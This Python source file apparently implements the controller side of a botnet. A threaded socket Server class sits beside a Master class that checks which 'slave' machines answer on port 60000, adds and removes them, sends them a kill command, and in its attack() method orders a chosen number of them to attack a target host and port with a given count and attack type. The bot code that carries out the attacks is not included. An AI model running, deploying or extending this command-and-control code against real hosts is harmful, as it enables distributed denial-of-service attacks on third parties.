import time 
import socket
import threading
from threading import Thread

def Log(event) :
    return "[{}] {}".format(time.ctime(),event)

class Server :
    def __init__(self,addr=('0.0.0.0',10000)) :
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.ReadBuffer = 8192
        self.addr = addr
        self.sock.bind(addr)
        self.running = True
    def start(self) :
        self.sock.listen(50)
        print(Log("Listening At {}:{}".format(self.addr[0],self.addr[1])))
        while self.running :
            cl , addr = self.sock.accept()
            # print(Log("Accepted connection from {}:{}".format(addr[0],addr[1])))
            self.handle_accepted(cl,addr)
    def handle_accepted(self,cl,addr) :
        """
        Currently handling "parallelism" by multithreading"""
        thread = Thread(target=self.handle_io,args=(cl,addr,))
        thread.start()
    def handle_io(self,cl,addr) :
        """
        Should Be Overridden in child class
        Or Will Funcion as Echo server"""
        client = cl 
        client.send('Welcome\n'.encode())
        while True :
            try :
                client.send(">>> ".encode())
                a = client.recv(self.ReadBuffer)
                client.send(a)
                if 'exit' in a.decode() :
                    client.close()
                    break
            except OSError :
                print(Log("OSError {}".format(addr)))
                client.close()
                break
            except BaseException as e :
                print(Log("{} cause by {}".format(e,addr)))
                break
            finally :
                print(Log("Connection with {} terminated".format(addr)))

class Master :
    def __init__(self,slaves = []) :
        print(Log("Master Initialization Started"))
        if len(slaves) > 255 :
            raise Exception("Master Cannot Handle More Than 255 Slaves Currently")
        # List of Slave IPs
        self.slaves = slaves

        # List of Active Slaves
        self.up = []

        # Port of bot slaves
        self.bPort = 60000

        # Read Buffer Size
        self.ReadBuffer = 4096

        print(Log("Checking Slaves"))
        self.ping()
        print(Log("Master Online"))

    def upCheck(self,sock,slave) :
        '''
        Function To Send Pingcode to Slave
        '''
        port = self.bPort
        try :
            # print(Log(f"Trying To Connect To {slave}"))
            sock.settimeout(3)
            sock.connect((slave,port))
            sock.send("ping".encode())
            print(Log(f"{slave} is up"))
            self.up.append(slave)
            sock.close()
        except socket.timeout:
            # print(Log(f"{slave} is down"))
            pass
        except Exception as e :
            print(Log(f"Error {slave} {port} {e}"))
            
    def ping(self) :
        '''
        Function To Check Slaves Which are Active
        '''
        self.up = []
        port = self.bPort
        threads = []
        for i in range(len(self.slaves)) :
            sock = self.getSocket()
            slave = self.slaves[i]
            t = Thread(target=self.upCheck,args=(sock,slave,))
            t.start()
            threads.append(t)
        for thread in threads :
            thread.join()

    def killSlaves(self) :
        '''
        Function to Terminate Slaves
        '''
        port = self.bPort
        print(self.up)
        threads = []
        for slave in self.up :
            sock = self.getSocket()
            t = Thread(target=self.send,args=(sock,slave,'kill',))
            t.start()
            threads.append(t)
        for thread in threads :
            thread.join()
        self.up = []
    
    def addSlave(self,slave) :
        '''
        Function to Add Slave
        '''
        self.slaves.append(slave)
        self.ping()

    def removeSlave(self,slave) :
        '''
        Function to Remove Slave
        '''
        if slave in self.slaves :
            self.slaves.remove(slave)
            self.ping()
        else :
            print(Log("IP not a slave"))
    
    def send(self,sock,slave,message) :
        '''
        Function to send command To Slave
        '''
        port = self.bPort
        try :
            sock.settimeout(3)
            sock.connect((slave,port))
            sock.send(message.encode())
            sock.close()
        except socket.timeout:
            pass
        except Exception as e :
            print(Log(f"Error {slave} {port} {message} : {e}"))
    
    def attack(self,target,port,count,aType,slaves) :
        '''
        Function to start Attack
        '''
        threads = []
        for slave in self.up[:slaves] :
            sock = self.getSocket()
            t = Thread(target=self.send,args=(sock,slave,f'attack:{target}:{port}:{count}:{aType}'))
            t.start()
            threads.append(t)
        for thread in threads :
            thread.join()
        
    def getSocket(self) :
        '''
        Function to create socket
        '''
        return socket.socket(socket.AF_INET,socket.SOCK_STREAM)